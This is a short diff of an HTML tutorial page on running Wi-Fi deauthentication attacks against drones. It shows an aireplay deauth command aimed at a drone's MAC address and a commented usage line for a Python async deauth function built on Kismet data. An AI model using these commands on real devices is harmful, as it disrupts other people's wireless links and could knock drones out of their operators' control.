@@ -102,7 +102,9 @@ sudo aireplay -D -deauth 10 -a &lt;drone_macaddr&gt; &lt;another_wlan_card&gt;
             <span class="hljs-keyword">await</span> asyncio.sleep(<span class="hljs-number">1</span>)
 
 <span class="hljs-comment"># Usage:</span>
-<span class="hljs-comment"># asyncio.run(deauth('wlan_card_mon','kismet.device.base.macaddr','dot11.device/dot11.device.associate_ssid_map'))</span>
+<span class="hljs-comment"># asyncio.run(deauth('wlan_card_mon','kismet.device.base.macaddr',</span>
+<span class="hljs-comment"># 'dot11.device/dot11.device.associate_ssid_map'))</span>
+
 </div></code></pre>
       <p>
         Declare &quot;cliaddr&quot; which is the last connection device from drone, let de-auth attack only effect
